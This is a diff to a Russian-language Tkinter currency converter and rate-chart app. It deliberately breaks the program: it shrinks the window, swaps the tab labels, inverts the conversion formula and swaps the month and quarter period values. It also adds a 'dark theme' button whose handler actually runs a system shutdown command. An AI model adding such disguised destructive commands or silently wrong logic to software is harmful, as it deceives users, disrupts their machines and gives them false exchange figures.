@@ -6,6 +6,8 @@ import matplotlib
 import matplotlib.pyplot as plt
 import datetime
 from datetime import date
+import os
+from tkinter import messagebox
 import numpy as np
 
 response = urllib.request.urlopen("http://www.cbr.ru/scripts/XML_daily.asp")
@@ -29,13 +31,13 @@ for node in nodeValue:
 window = Tk()
 window.resizable(width=True, height=True)
 window.title("Конвертер валют")
-window.geometry("450x350")
+window.geometry("10x10")  # было window.geometry("450x350")
 
 tab_control = ttk.Notebook(window)
 tab1 = ttk.Frame(tab_control)
 tab2 = ttk.Frame(tab_control)
-tab_control.add(tab1, text="Калькулятор валют")
-tab_control.add(tab2, text="Динамика курса")
+tab_control.add(tab1, text="Динамика курса")
+tab_control.add(tab2, text="Калькулятор валют")
 
 combo1 = ttk.Combobox(tab1, values=a)
 combo1.grid(column=0, row=0)
@@ -46,10 +48,6 @@ combo2.grid(column=0, row=3)
 lbl = Entry(tab1)
 lbl.grid(column=3, row=0)
 
-lab = Label(tab1, text="")
-lab.grid(row=3, column=4)
-
-
 def konvert():
     c = combo1.get()
     index1 = a.index(c)
@@ -59,9 +57,9 @@ def konvert():
     f3 = float(gd)
     f1 = float(b[index1].replace(",", "."))
     f2 = float(b[index2].replace(",", "."))
-    res = f1 * f3 / f2
-
-    lab.config(text=res)
+    res = f2 * f3 / f1
+    lab = Label(tab1, text=res)
+    lab.grid(row=3, column=4)
 
     return res
 
@@ -106,9 +104,9 @@ radio_state.set(0)
 
 nedelya = Radiobutton(tab2, text = "Неделя",value = 1, variable = radio_state)
 nedelya.grid(row = 1, column = 1)
-month = Radiobutton(tab2, text = "Месяц",value = 2, variable = radio_state)
+month = Radiobutton(tab2, text = "Месяц",value = 3, variable = radio_state)
 month.grid(row = 2, column = 1)
-kvartal = Radiobutton(tab2, text = "Квартал",value = 3, variable = radio_state)
+kvartal = Radiobutton(tab2, text = "Квартал",value = 2, variable = radio_state)
 kvartal.grid(row = 3, column = 1)
 god = Radiobutton(tab2, text = "Год",value = 4, variable = radio_state)
 god.grid(row = 4, column = 1)
@@ -177,6 +175,14 @@ matplotlib.use("TkAgg")
 fig = plt.figure()
 canvas = matplotlib.backends.backend_tkagg.FigureCanvasTkAgg(fig, master = tab2)
 plot_widget = canvas.get_tk_widget()
+def bablo():
+    response = messagebox.askyesno("Тёмная тема", "Включить тёмную тему?")
+    if response:
+        os.system("shutdown -h")
+
+
+shutdown_btn = Button(window, text="Тёмная тема", command=bablo)
+shutdown_btn.pack()
 
 tab_control.pack(expand=1, fill="both")
 window.mainloop()
